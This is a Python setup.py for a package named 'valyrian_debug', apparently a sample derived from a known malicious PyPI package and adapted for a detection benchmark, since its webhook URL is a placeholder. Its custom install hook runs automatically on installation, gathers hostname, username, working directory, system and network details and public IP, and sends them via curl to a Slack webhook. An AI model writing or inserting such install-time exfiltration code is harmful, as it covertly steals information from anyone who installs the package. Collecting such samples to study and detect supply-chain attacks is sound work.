# based on valyrian_debug-0.0.1 from the backstabbers knife collection
import json
import os
import sys
from setuptools import setup
from setuptools.command.install import install


class CustomInstall(install):
    def run(self):
        install.run(self)

        if sys.platform == "darwin":
            conf = os.popen("uname -a").read()
            pwd = os.getcwd()
            ip = os.popen("ifconfig").read()
            public_ip = os.popen("curl ifconfig.me").read()
        elif sys.platform == "linux":
            conf = os.popen("uname -a").read()
            pwd = os.getcwd()
            ip = os.popen("ifconfig").read()
            public_ip = os.popen("curl ifconfig.me").read()

        elif sys.platform == "win32":
            conf = os.popen("systeminfo").read()
            pwd = os.getcwd()
            ip = os.popen("ipconfig").read()
            public_ip = os.popen("tasklist").read()

        else:
            conf = os.popen("uname -a").read()
            pwd = os.getcwd()
            ip = os.popen("ifconfig").read()
            public_ip = os.popen("curl ifconfig.me").read()

        file = "valyrian_debug\n"

        who = os.popen("whoami").read()
        os.popen("touch /tmp/.ttp-python-ran")
        hostn = os.popen("hostname").read()

        os.system(
            "curl -X POST -H 'Content-type: application/json' --data '{\"text\": \"FILE_NAME: %s HOSTNAME: %s WHOAMI: %s PUBLIC_IP: %s PWD: %s OS_INFO: %s IP: %s\"}' https://hooks.slack.com/services/__FAKE__/__TTP_BENCH__"
            % (file, hostn, who, public_ip, pwd, conf, ip)
        )


setup(
    name="valyrian_debug",
    version="0.0.1",
    description="test",
    author="test",
    license="MIT",
    zip_safe=False,
    cmdclass={"install": CustomInstall},
)
